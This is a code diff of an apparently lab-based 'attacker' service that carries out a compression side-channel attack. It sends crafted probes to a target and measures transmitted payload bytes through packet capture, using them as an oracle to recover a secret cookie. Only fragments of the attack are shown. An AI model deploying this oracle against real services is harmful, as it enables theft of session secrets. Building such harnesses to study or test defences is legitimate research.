@@ -6,16 +6,14 @@ import socket
 import aiohttp
 from aiohttp import web
 
-from attacker import engine
+from attacker import engine, measure_pcap
 from attacker.inject import build_probe
-from attacker.measure import DEFAULT_TX_BYTES_PATH, read_tx_bytes
 
 LOG = logging.getLogger("attacker.service")
 
 ENGINE_PORT = int(os.environ.get("ENGINE_PORT", "9000"))
 HARNESS_URL = os.environ.get("HARNESS_URL", "http://client:8000")
 SETTLE_S = float(os.environ.get("SETTLE_S", "0.15"))
-TX_BYTES_PATH = os.environ.get("TX_BYTES_PATH", DEFAULT_TX_BYTES_PATH)
 COOKIE_LENGTH = int(os.environ.get("COOKIE_LENGTH", "16"))
 MIN_MARGIN = int(os.environ.get("MIN_MARGIN", "8"))
 MIN_AGREEMENT = int(os.environ.get("MIN_AGREEMENT", "5"))
@@ -27,19 +25,20 @@ def _make_oracle(target_port: int, http: aiohttp.ClientSession):
         async with http.post(f"{HARNESS_URL}/trigger") as r:
             if r.status != 200:
                 raise RuntimeError(f"harness /trigger returned {r.status}")
-        before = read_tx_bytes(TX_BYTES_PATH)
+        measure_pcap.PACKET_LOG.clear()
         probe = build_probe(prefix, candidate, align_len)
         loop = asyncio.get_running_loop()
         await loop.run_in_executor(None, _send_probe, target_port, probe)
         await asyncio.sleep(SETTLE_S)
-        after = read_tx_bytes(TX_BYTES_PATH)
-        return after - before
+        records = measure_pcap.PACKET_LOG.snapshot(include_acks=False)
+        return measure_pcap.sum_payload(records)
     return oracle
 
 
 def _send_probe(target_port: int, probe: bytes) -> None:
     with socket.create_connection(("127.0.0.1", target_port), timeout=5.0) as s:
         s.sendall(probe)
+        s.shutdown(socket.SHUT_WR)
 
 
 async def _run_attack_handler(request: web.Request) -> web.Response:
@@ -84,7 +83,11 @@ def _make_app() -> web.Application:
 def main() -> None:
     logging.basicConfig(level=logging.INFO,
                         format="%(asctime)s %(name)s %(levelname)s %(message)s")
-    web.run_app(_make_app(), host="0.0.0.0", port=ENGINE_PORT, access_log=None)
+    measure_pcap.start()
+    try:
+        web.run_app(_make_app(), host="0.0.0.0", port=ENGINE_PORT, access_log=None)
+    finally:
+        measure_pcap.stop()
 
 
 if __name__ == "__main__":
